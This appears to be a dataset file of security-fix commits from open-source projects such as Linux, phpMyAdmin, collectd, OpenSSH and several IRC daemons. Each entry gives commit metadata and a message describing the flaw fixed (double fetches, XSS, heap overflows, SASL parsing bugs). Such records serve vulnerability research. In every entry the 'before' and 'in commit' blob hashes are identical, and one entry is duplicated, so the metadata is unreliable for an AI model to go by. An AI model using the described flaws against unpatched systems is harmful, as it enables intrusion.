tcp: make challenge acks less predictable\n\nYue Cao claims that current host rate limiting of challenge ACKS (RFC 5961) could leak enough information to allow a patient attacker to hijack TCP sessions. He will soon provide details in an academic paper.\n\nThis patch increases the default limit from 100 to 1000, and adds some randomization so that the attacker can no longer hijack sessions without spending a considerable amount of probes.\n\nBased on initial analysis and patch from Linus.\n\nNote that we also have per socket rate limiting, so it is tempting to remove the host limit in the future.\n\nv2: randomize the count of challenge acks per second, not the period.\n\nFixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2") Reported-by: Yue Cao <ycao009@ucr.edu> Signed-off-by: Eric Dumazet <edumazet@google.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: Yuchung Cheng <ycheng@google.com> Cc: Neal Cardwell <ncardwell@google.com> Acked-by: Neal Cardwell <ncardwell@google.com> Acked-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1dca386505f396f0c2035112a403cc80768a141f
File(s) In Commit: 
    setup/frames/index.inc.php
Blob(s) In Commit: 
    d28305a6909d05fed0a15c67ff1a5f18120d4d7f
Blob(s) Before Fix: 
    d28305a6909d05fed0a15c67ff1a5f18120d4d7f
Projects:
    007durgesh219_phpmyadmin
Commit Message for 1dca386505f396f0c2035112a403cc80768a141f:
Use javascript for redirection to https\n\nThe current approach is broken since whitelisting is active in url.php and also allows potential bbcode injection.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    ef6c66dca1b0cb0a1a482477938cfc859d2baee3
File(s) In Commit: 
    libraries/central_columns.lib.php
Blob(s) In Commit: 
    6306e3f40302bfce0f10668c868fbd7a449adbaf
Blob(s) Before Fix: 
    6306e3f40302bfce0f10668c868fbd7a449adbaf
Projects:
    007durgesh219_phpmyadmin
Commit Message for ef6c66dca1b0cb0a1a482477938cfc859d2baee3:
Properly escape database name in central column queries\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    72213573182896bd6a6e5af5ba1881dd87c4a20b
File(s) In Commit: 
    templates/table/structure/display_table_stats.phtml
Blob(s) In Commit: 
    04839f6f178c2551e4bba0b134c1a015ab8be8f2
Blob(s) Before Fix: 
    04839f6f178c2551e4bba0b134c1a015ab8be8f2
Projects:
    007durgesh219_phpmyadmin
Commit Message for 72213573182896bd6a6e5af5ba1881dd87c4a20b:
Fix XSS on table structure\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    4767f24ea4c1e3822ce71a636c341e8ad8d07aa6
File(s) In Commit: 
    js/get_scripts.js.php
Blob(s) In Commit: 
    06705c5d4ea030932a66a029448168311ac5ba8c
Blob(s) Before Fix: 
    06705c5d4ea030932a66a029448168311ac5ba8c
Projects:
    007durgesh219_phpmyadmin
Commit Message for 4767f24ea4c1e3822ce71a636c341e8ad8d07aa6:
Limit number of included scripts in get_scripts.js.php\n\nThis avoids potential DOS, the limit is same as we use for generating the URLs.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    9bf292bfca94694a721449e3fd752493856710f6
File(s) In Commit: 
    drivers/misc/mic/vop/vop_vringh.c
Blob(s) In Commit: 
    88e45234d527518e0d449d598c5f04a5be5538a1
Blob(s) Before Fix: 
    88e45234d527518e0d449d598c5f04a5be5538a1
Projects:
    0-T-0_ps4-linux
Commit Message for 9bf292bfca94694a721449e3fd752493856710f6:
misc: mic: Fix for double fetch security bug in VOP driver\n\nThe MIC VOP driver does two successive reads from user space to read a variable length data structure. Kernel memory corruption can result if the data structure changes between the two reads. This patch disallows the chance of this happening.\n\nBugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651 Reported by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com> Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    b7c217680cda02dddced245d237ebe8c383be285
File(s) In Commit: 
    rwpng.c
Blob(s) In Commit: 
    e3f59d11007489f2ad5f9af11d86c1f060f26ca0
Blob(s) Before Fix: 
    e3f59d11007489f2ad5f9af11d86c1f060f26ca0
Projects:
    7snovic_pngquant
Commit Message for b7c217680cda02dddced245d237ebe8c383be285:
Fix integer overflow in rwpng.h (CVE-2016-5735)\n\nReported by Choi Jaeseung  Found with Sparrow (http://ropas.snu.ac.kr/sparrow)

======================================================================
Commit With Fix: 
    8573c2ee172f66c1667de49685c88fdc8883ca8b
File(s) In Commit: 
    templates/gerrit.config.erb
Blob(s) In Commit: 
    1c922e0b1178a22664a75f6a2d4a851d9f46cfc3
Blob(s) Before Fix: 
    1c922e0b1178a22664a75f6a2d4a851d9f46cfc3
Projects:
    131_puppetlabs-apache
Commit Message for 8573c2ee172f66c1667de49685c88fdc8883ca8b:
Remove text/html as a safe mimetype\n\nThe non-default safe mimetype in gerrit exists purely to proect installs against setting this - when set, downloading a text/html file will result in that file being rendered.\n\nChange-Id: I648ada0b26aaf35ece9ef57f609b46f23f6e422a

======================================================================
Commit With Fix: 
    93a2001bdfd5376c3dc2158653034c20392d15c5
File(s) In Commit: 
    drivers/hid/usbhid/hiddev.c
Blob(s) In Commit: 
    700145b1508894f30a018aef278d15cfc458ef3a
Blob(s) Before Fix: 
    700145b1508894f30a018aef278d15cfc458ef3a
Projects:
    0-T-0_ps4-linux
Commit Message for 93a2001bdfd5376c3dc2158653034c20392d15c5:
HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands\n\nThis patch validates the num_values parameter from userland during the HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter leading to a heap overflow.\n\nCc: stable@vger.kernel.org Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    3ad08e01b4d253c66ae56414886089684155af22
File(s) In Commit: 
    libarchive/archive_read_support_format_iso9660.c
Blob(s) In Commit: 
    f41ba386562365a536c15fb980dbde08c7a5a131
Blob(s) Before Fix: 
    f41ba386562365a536c15fb980dbde08c7a5a131
Projects:
    AasemShokr_libarchive
Commit Message for 3ad08e01b4d253c66ae56414886089684155af22:
Issue 717:  Fix integer overflow when computing location of volume descriptor\n\nThe multiplication here defaulted to 'int' but calculations of file positions should always use int64_t.  A simple cast suffices to fix this since the base location is always 32 bits for ISO, so multiplying by the sector size will never overflow a 64-bit integer.

======================================================================
Commit With Fix: 
    532c34b5fbf1687df63b3fcd5b2846312ac943c6
File(s) In Commit: 
    drivers/s390/char/sclp_ctl.c
Blob(s) In Commit: 
    ea607a4a1bddaf3e41165aebed1fd787b87d754e
Blob(s) Before Fix: 
    ea607a4a1bddaf3e41165aebed1fd787b87d754e
Projects:
    0-T-0_ps4-linux
Commit Message for 532c34b5fbf1687df63b3fcd5b2846312ac943c6:
s390/sclp_ctl: fix potential information leak with /dev/sclp\n\nThe sclp_ctl_ioctl_sccb function uses two copy_from_user calls to retrieve the sclp request from user space. The first copy_from_user fetches the length of the request which is stored in the first two bytes of the request. The second copy_from_user gets the complete sclp request, but this copies the length field a second time. A malicious user may have changed the length in the meantime.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com> Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    43761473c254b45883a64441dd0bc85a42f3645c
File(s) In Commit: 
    kernel/auditsc.c
Blob(s) In Commit: 
    c65af21a12d6d2e7b56e99ed2fdd6d284a9ec43a
Blob(s) Before Fix: 
    c65af21a12d6d2e7b56e99ed2fdd6d284a9ec43a
Projects:
    0-T-0_ps4-linux
Commit Message for 43761473c254b45883a64441dd0bc85a42f3645c:
audit: fix a double fetch in audit_log_single_execve_arg()\n\nThere is a double fetch problem in audit_log_single_execve_arg() where we first check the execve(2) argumnets for any "bad" characters which would require hex encoding and then re-fetch the arguments for logging in the audit record[1].  Of course this leaves a window of opportunity for an unsavory application to munge with the data.\n\nThis patch reworks things by only fetching the argument data once[2] into a buffer where it is scanned and logged into the audit records(s).  In addition to fixing the double fetch, this patch improves on the original code in a few other ways: better handling of large arguments which require encoding, stricter record length checking, and some performance improvements (completely unverified, but we got rid of some strlen() calls, that's got to be a good thing).\n\nAs part of the development of this patch, I've also created a basic regression test for the audit-testsuite, the test can be tracked on GitHub at the following link:\n\n * https://github.com/linux-audit/audit-testsuite/issues/25\n\n[1] If you pay careful attention, there is actually a triple fetch problem due to a strnlen_user() call at the top of the function.\n\n[2] This is a tiny white lie, we do make a call to strnlen_user() prior to fetching the argument data.  I don't like it, but due to the way the audit record is structured we really have no choice unless we copy the entire argument at once (which would require a rather wasteful allocation).  The good news is that with this patch the kernel no longer relies on this strnlen_user() value for anything beyond recording it in the log, we also update it with a trustworthy value whenever possible.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Cc: <stable@vger.kernel.org> Signed-off-by: Paul Moore <paul@paul-moore.com>

======================================================================
Commit With Fix: 
    096cdc6f52225835ff503f987a0d68ef770bb78e
File(s) In Commit: 
    drivers/platform/chrome/cros_ec_dev.c
Blob(s) In Commit: 
    8abd80dbcbed7974b4ace4265dd9dad1bca89edd
Blob(s) Before Fix: 
    8abd80dbcbed7974b4ace4265dd9dad1bca89edd
Projects:
    0-T-0_ps4-linux
Commit Message for 096cdc6f52225835ff503f987a0d68ef770bb78e:
platform/chrome: cros_ec_dev - double fetch bug in ioctl\n\nWe verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure that those values have not changed between the two copy_from_user() calls.  Otherwise it could lead to a buffer overflow.\n\nAdditionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value. We should use the new smaller value so we don't copy too much data to the user.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com> Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Kees Cook <keescook@chromium.org> Tested-by: Gwendal Grignou <gwendal@chromium.org> Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Olof Johansson <olof@lixom.net>

======================================================================
Commit With Fix: 
    30a46a4647fd1df9cf52e43bf467f0d9265096ca
File(s) In Commit: 
    security/apparmor/lsm.c
Blob(s) In Commit: 
    7798e1608f4f4bb429c94017e2c6f73b07a7afc9
Blob(s) Before Fix: 
    7798e1608f4f4bb429c94017e2c6f73b07a7afc9
Projects:
    0-T-0_ps4-linux
Commit Message for 30a46a4647fd1df9cf52e43bf467f0d9265096ca:
apparmor: fix oops, validate buffer size in apparmor_setprocattr()\n\nWhen proc_pid_attr_write() was changed to use memdup_user apparmor's (interface violating) assumption that the setprocattr buffer was always a single page was violated.\n\nThe size test is not strictly speaking needed as proc_pid_attr_write() will reject anything larger, but for the sake of robustness we can keep it in.\n\nSMACK and SELinux look safe to me, but somebody else should probably have a look just in case.\n\nBased on original patch from Vegard Nossum <vegard.nossum@oracle.com> modified for the case that apparmor provides null termination.\n\nFixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a Reported-by: Vegard Nossum <vegard.nossum@oracle.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: John Johansen <john.johansen@canonical.com> Cc: Paul Moore <paul@paul-moore.com> Cc: Stephen Smalley <sds@tycho.nsa.gov> Cc: Eric Paris <eparis@parisplace.org> Cc: Casey Schaufler <casey@schaufler-ca.com> Cc: stable@kernel.org Signed-off-by: John Johansen <john.johansen@canonical.com> Reviewed-by: Tyler Hicks <tyhicks@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    11f3710417d026ea2f4fcf362d866342c5274185
File(s) In Commit: 
    fs/overlayfs/dir.c
Blob(s) In Commit: 
    bc1758a160f6d7e857d43294c2c6656ca122a537
Blob(s) Before Fix: 
    bc1758a160f6d7e857d43294c2c6656ca122a537
Projects:
    0-T-0_ps4-linux
Commit Message for 11f3710417d026ea2f4fcf362d866342c5274185:
ovl: verify upper dentry before unlink and rename\n\nUnlink and rename in overlayfs checked the upper dentry for staleness by verifying upper->d_parent against upperdir.  However the dentry can go stale also by being unhashed, for example.\n\nExpand the verification to actually look up the name again (under parent lock) and check if it matches the upper dentry.  This matches what the VFS does before passing the dentry to filesytem's unlink/rename methods, which excludes any inconsistency caused by overlayfs.\n\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>

======================================================================
Commit With Fix: 
    b589096f907052b3a4da2b9ccc9b0e2e888dfc18
File(s) In Commit: 
    src/network.c
Blob(s) In Commit: 
    5c7761d36faa0d0cdc03fb53bb65ae1ed7e388d6
Blob(s) Before Fix: 
    5c7761d36faa0d0cdc03fb53bb65ae1ed7e388d6
Projects:
    01BTC10_collectd
Commit Message for b589096f907052b3a4da2b9ccc9b0e2e888dfc18:
network plugin: Fix heap overflow in parse_packet().\n\nEmilien Gaspar has identified a heap overflow in parse_packet(), the function used by the network plugin to parse incoming network packets.\n\nThis is a vulnerability in collectd, though the scope is not clear at this point. At the very least specially crafted network packets can be used to crash the daemon. We can't rule out a potential remote code execution though.\n\nFixes: CVE-2016-6254

======================================================================
Commit With Fix: 
    eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba
File(s) In Commit: 
    jwcrypto/jwa.py
Blob(s) In Commit: 
    521890bae483682790efa9e0af95a6e1565a4ea1
Blob(s) Before Fix: 
    521890bae483682790efa9e0af95a6e1565a4ea1
Projects:
    alex_jwcrypto
Commit Message for eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba:
CVE-2016-6298: Million Messages Attack mitigation\n\nRFC 3218 describes an oracle attack called Million Messages Attack against RSA with PKCS1 v1.5 padding.\n\nDepending on how JWEs are used a server may become an Oracle, and the mitigation presecribed in RFC 3218 2.3.2 need to be implemented.\n\nMany thanks to Dennis Detering for his responsible disclosure and help verifying the mitigation approach.\n\nResolves #65 Signed-off-by: Simo Sorce <simo@redhat.com> Closes #66

======================================================================
Commit With Fix: 
    0f35fe14acf0d0d3b55e9337bc5e2b9640ff2372
File(s) In Commit: 
    app/helpers/form_helper.rb
Blob(s) In Commit: 
    2e7d451fb2ef974f539c4f2eb24eb1bf606f2df5
Blob(s) Before Fix: 
    2e7d451fb2ef974f539c4f2eb24eb1bf606f2df5
Projects:
    0-T-0_foreman
Commit Message for 0f35fe14acf0d0d3b55e9337bc5e2b9640ff2372:
Fixes #16024 - escape labels of form fields

======================================================================
Commit With Fix: 
    850c38451c7bbde75521b796d16aca26e4d240a0
File(s) In Commit: 
    app/assets/javascripts/host_edit_interfaces.js
Blob(s) In Commit: 
    fcc720d260dc67b9968bfd434663b721cd57dd8f
Blob(s) Before Fix: 
    fcc720d260dc67b9968bfd434663b721cd57dd8f
Projects:
    0-T-0_foreman
Commit Message for 850c38451c7bbde75521b796d16aca26e4d240a0:
Fixes #16022 - Prevent stored XSS in host interface form\n\nThe host interface form may contain a stored XSS in the identifier field allowing a user allowed to edit a host's interfaces to cause code execution by another user viewing that host's edit form.

======================================================================
Commit With Fix: 
    51093254bf879bc9ce96590400a87897c7498463
File(s) In Commit: 
    drivers/infiniband/ulp/srpt/ib_srpt.c
Blob(s) In Commit: 
    4328679a67a76792694a3e1169bc4e7bdac10d2f
Blob(s) Before Fix: 
    4328679a67a76792694a3e1169bc4e7bdac10d2f
Projects:
    0-T-0_ps4-linux
Commit Message for 51093254bf879bc9ce96590400a87897c7498463:
IB/srpt: Simplify srpt_handle_tsk_mgmt()\n\nLet the target core check task existence instead of the SRP target driver. Additionally, let the target core check the validity of the task management request instead of the ib_srpt driver.\n\nThis patch fixes the following kernel crash:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000001 IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt] Oops: 0002 [#1] SMP Call Trace:  [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]  [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]  [<ffffffff8109726f>] kthread+0xcf/0xe0  [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0\n\nSigned-off-by: Bart Van Assche <bart.vanassche@sandisk.com> Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr") Tested-by: Alex Estrin <alex.estrin@intel.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Cc: Nicholas Bellinger <nab@linux-iscsi.org> Cc: Sagi Grimberg <sagig@mellanox.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Doug Ledford <dledford@redhat.com>

======================================================================
Commit With Fix: 
    a5cbe929ac3255d371e698f62dc256afe7006466
File(s) In Commit: 
    src/flex.skl
Blob(s) In Commit: 
    64f853dce6e8663837cadcf97f4ad5070db62832
Blob(s) Before Fix: 
    64f853dce6e8663837cadcf97f4ad5070db62832
Projects:
    0-wiz-0_flex
Commit Message for a5cbe929ac3255d371e698f62dc256afe7006466:
Fixed incorrect integer type

======================================================================
Commit With Fix: 
    dd84447b63a71fa8c3f47071b09454efc667767b
File(s) In Commit: 
    MagickCore/property.c
Blob(s) In Commit: 
    0b4b75c4941eea2d9d09b40d2fbbacb6c9f32094
Blob(s) Before Fix: 
    0b4b75c4941eea2d9d09b40d2fbbacb6c9f32094
Projects:
    2016repotsheyue_ImageMagick
Commit Message for dd84447b63a71fa8c3f47071b09454efc667767b:
Prevent buffer overflow (bug report from Ibrahim el-sayed)

======================================================================
Commit With Fix: 
    fcd135c9df440bcd2d5870405ad3311743d78d97
File(s) In Commit: 
    auth-passwd.c
Blob(s) In Commit: 
    996c2cf71b002281181190300d90d20173ea6a30
Blob(s) Before Fix: 
    996c2cf71b002281181190300d90d20173ea6a30
Projects:
    0-T-0_docker
    0neday_openssh-portable
Commit Message for fcd135c9df440bcd2d5870405ad3311743d78d97:
upstream commit\n\nSkip passwords longer than 1k in length so clients can't easily DoS sshd by sending very long passwords, causing it to spend CPU hashing them. feedback djm@, ok markus@.\n\nBrought to our attention by tomas.kuthan at oracle.com, shilei-c at 360.cn and coredump at autistici.org\n\nUpstream-ID: d0af7d4a2190b63ba1d38eec502bc4be0be9e333

======================================================================
Commit With Fix: 
    10eec60ce79187686e052092e5383c99b4420a20
File(s) In Commit: 
    fs/ioctl.c
Blob(s) In Commit: 
    0f56deb24ce6547c1aaa13e6a731779c09047077
Blob(s) Before Fix: 
    0f56deb24ce6547c1aaa13e6a731779c09047077
Projects:
    0-T-0_ps4-linux
Commit Message for 10eec60ce79187686e052092e5383c99b4420a20:
vfs: ioctl: prevent double-fetch in dedupe ioctl\n\nThis prevents a double-fetch from user space that can lead to to an undersized allocation and heap overflow.\n\nFixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs") Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    5aaab1a49679c26dbcb6fb6dc25799950d70cc71
File(s) In Commit: 
    usr/src/uts/intel/ia32/ml/copy.s
Blob(s) In Commit: 
    7593de374e4fa9cdc1e6c32d376c1ef7fec23f51
Blob(s) Before Fix: 
    7593de374e4fa9cdc1e6c32d376c1ef7fec23f51
Projects:
    0rbiter_zfs
Commit Message for 5aaab1a49679c26dbcb6fb6dc25799950d70cc71:
7488 bcopy and bzero should mind signed bits Reviewed by: Jerry Jelinek <jerry.jelinek@joyent.com> Reviewed by: Patrick Mooney <patrick.mooney@joyent.com> Approved by: Richard Lowe <richlowe@richlowe.net>

======================================================================
Commit With Fix: 
    f63a8daa5812afef4f06c962351687e1ff9ccb2b
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    417a96bf3d417d9f38b4a74079165261d7958265
Blob(s) Before Fix: 
    417a96bf3d417d9f38b4a74079165261d7958265
Projects:
    0-T-0_ps4-linux
Commit Message for f63a8daa5812afef4f06c962351687e1ff9ccb2b:
perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around changing event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing  and while it appears to work, please give it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of event->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Paul E. McKenney <paulmck@linux.vnet.ibm.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.209535886@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f63a8daa5812afef4f06c962351687e1ff9ccb2b
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    417a96bf3d417d9f38b4a74079165261d7958265
Blob(s) Before Fix: 
    417a96bf3d417d9f38b4a74079165261d7958265
Projects:
    0-T-0_ps4-linux
Commit Message for f63a8daa5812afef4f06c962351687e1ff9ccb2b:
perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around changing event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing  and while it appears to work, please give it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of event->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Paul E. McKenney <paulmck@linux.vnet.ibm.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/20150123125834.209535886@infradead.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    bb1fceca22492109be12640d49f5ea5a544c6bb4
File(s) In Commit: 
    include/net/tcp.h
Blob(s) In Commit: 
    7717302cab91e1bb18cc42c3f2d4b51f98f3c148
Blob(s) Before Fix: 
    7717302cab91e1bb18cc42c3f2d4b51f98f3c148
Projects:
    0-T-0_ps4-linux
Commit Message for bb1fceca22492109be12640d49f5ea5a544c6bb4:
tcp: fix use after free in tcp_xmit_retransmit_queue()\n\nWhen tcp_sendmsg() allocates a fresh and empty skb, it puts it at the tail of the write queue using tcp_add_write_queue_tail()\n\nThen it attempts to copy user data into this fresh skb.\n\nIf the copy fails, we undo the work and remove the fresh skb.\n\nUnfortunately, this undo lacks the change done to tp->highest_sack and we can leave a dangling pointer (to a freed skb)\n\nLater, tcp_xmit_retransmit_queue() can dereference this pointer and access freed memory. For regular kernels where memory is not unmapped, this might cause SACK bugs because tcp_highest_sack_seq() is buggy, returning garbage instead of tp->snd_nxt, but with various debug features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.\n\nThis bug was found by Marco Grassi thanks to syzkaller.\n\nFixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb") Reported-by: Marco Grassi <marco.gra@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Ilpo Järvinen <ilpo.jarvinen@helsinki.fi> Cc: Yuchung Cheng <ycheng@google.com> Cc: Neal Cardwell <ncardwell@google.com> Acked-by: Neal Cardwell <ncardwell@google.com> Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7086c2d8b4b20ac14013b36761ac04f0abf21a4e
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    72ac90f1c337946f1f0b695328a6365609bcde09
Blob(s) Before Fix: 
    72ac90f1c337946f1f0b695328a6365609bcde09
Projects:
    01-Scripts_mantisbt
Commit Message for 7086c2d8b4b20ac14013b36761ac04f0abf21a4e:
Fix XSS in view_all_bug_page.php\n\nThe value of the view_type parameter on the view_all_bug_page.php page was not encoded before being displayed.\n\nThis vulnerability was discovered by Will Dollman of Netcraft Ltd.\n\nInitial patch modified to use strict comparison per Will's suggestion.\n\nFixes #21611

======================================================================
Commit With Fix: 
    34b88a68f26a75e4fded796f1a49c40f82234b7d
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    5f77a8e93830bd30cef60e68354bda683c9acc43
Blob(s) Before Fix: 
    5f77a8e93830bd30cef60e68354bda683c9acc43
Projects:
    0-T-0_ps4-linux
Commit Message for 34b88a68f26a75e4fded796f1a49c40f82234b7d:
net: Fix use after free in the recvmmsg exit path\n\nThe syzkaller fuzzer hit the following use-after-free:\n\n  Call Trace:    [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295    [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261    [<     inline     >] SYSC_recvmmsg net/socket.c:2281    [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270    [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a   arch/x86/entry/entry_64.S:185\n\nAnd, as Dmitry rightly assessed, that is because we can drop the reference and then touch it when the underlying recvmsg calls return some packets and then hit an error, which will make recvmmsg to set sock->sk->sk_err, oops, fix it.\n\nReported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: Alexander Potapenko <glider@google.com> Cc: Eric Dumazet <edumazet@google.com> Cc: Kostya Serebryany <kcc@google.com> Cc: Sasha Levin <sasha.levin@oracle.com> Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall") http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911
File(s) In Commit: 
    Zend/zend_alloc.c
Blob(s) In Commit: 
    a79d67b4b996a9dba52003590b2ad1a20dabb820
Blob(s) Before Fix: 
    a79d67b4b996a9dba52003590b2ad1a20dabb820
Projects:
    0014593_php-src
Commit Message for c2a13ced4272f2e65d2773e2ea6ca11c1ce4a911:
Fix bug #72742 - memory allocator fails to realloc small block to large one

======================================================================
Commit With Fix: 
    72dbb7f416160f490c4e9987040989a10ad431c7
File(s) In Commit: 
    ext/curl/interface.c
Blob(s) In Commit: 
    7069710ece192683350f64700c5d991d10bf994f
Blob(s) Before Fix: 
    7069710ece192683350f64700c5d991d10bf994f
Projects:
    0014593_php-src
Commit Message for 72dbb7f416160f490c4e9987040989a10ad431c7:
Fix bug #72674 - check both curl_escape and curl_unescape

======================================================================
Commit With Fix: 
    74fafb7f11b06747f69f182ad5e3769b665eea7a
File(s) In Commit: 
    src/modules/m_sasl.cpp
Blob(s) In Commit: 
    16a15357f57e9eef8720a34d1a3caf01a723324a
Blob(s) Before Fix: 
    16a15357f57e9eef8720a34d1a3caf01a723324a
Projects:
    0x277F_inspircd
Commit Message for 74fafb7f11b06747f69f182ad5e3769b665eea7a:
m_sasl: don't allow AUTHENTICATE with mechanisms with a space

======================================================================
Commit With Fix: 
    818a3fda944b26d4814132cee14cfda4ea4aa824
File(s) In Commit: 
    modules/m_sasl.c
Blob(s) In Commit: 
    93c5a04124f3ee7f5bce71dfd65ced91749c532e
Blob(s) Before Fix: 
    93c5a04124f3ee7f5bce71dfd65ced91749c532e
Projects:
    0re5ama_ircd-seven
Commit Message for 818a3fda944b26d4814132cee14cfda4ea4aa824:
SASL: Disallow beginning : and space anywhere in AUTHENTICATE parameter\n\nThis is a FIX FOR A SECURITY VULNERABILITY. All Charybdis users must apply this fix if you support SASL on your servers, or unload m_sasl.so in the meantime.

======================================================================
Commit With Fix: 
    f473e355e1dc422c4f019dbf86bc50ba1a34a766
File(s) In Commit: 
    src/modules/m_sasl.c
Blob(s) In Commit: 
    b53818a96ff59c082a777cb43a316c9dc350930a
Blob(s) Before Fix: 
    b53818a96ff59c082a777cb43a316c9dc350930a
Projects:
    Adam-_unrealircd
Commit Message for f473e355e1dc422c4f019dbf86bc50ba1a34a766:
Fix AUTHENTICATE bug

======================================================================
Commit With Fix: 
    f50a84bad996d438e7b31b9e74c32a41e43f8be5
File(s) In Commit: 
    ircd/m_authenticate.c
Blob(s) In Commit: 
    f8960bd54da617d368a6e9d634d72f613780db6c
Blob(s) Before Fix: 
    f8960bd54da617d368a6e9d634d72f613780db6c
Projects:
    0re5ama_ircd-seven
Commit Message for f50a84bad996d438e7b31b9e74c32a41e43f8be5:
Fix to prevent SASL security vulnerability

======================================================================
Commit With Fix: 
    dd975fff7fce81bf12f9c59edb1a99475747c83c
File(s) In Commit: 
    skins_site/_site_body_header.inc.php
Blob(s) In Commit: 
    99e63b9a906d93308f30f845efc1914aa71e034b
Blob(s) Before Fix: 
    99e63b9a906d93308f30f845efc1914aa71e034b
Projects:
    Acidburn0zzz_b2evolution
Commit Message for dd975fff7fce81bf12f9c59edb1a99475747c83c:
Fix XSS vulnerability on "site name"

======================================================================
Commit With Fix: 
    87a25bb543c8e4c09b48d4b4a6c7db31ce58df06
File(s) In Commit: 
    arch/X86/X86Mapping.c
Blob(s) In Commit: 
    a9d8980f33449cb3172ff2604f10773b81754c1f
Blob(s) Before Fix: 
    a9d8980f33449cb3172ff2604f10773b81754c1f
Projects:
    0vercl0k_capstone
Commit Message for 87a25bb543c8e4c09b48d4b4a6c7db31ce58df06:
x86: fast path checking for X86_insn_reg_intel()

======================================================================
Commit With Fix: 
    bd9eca9f40220f9918ec3cc7ae9ef422b3e448b8
File(s) In Commit: 
    drivers/adodb-pdo.inc.php
Blob(s) In Commit: 
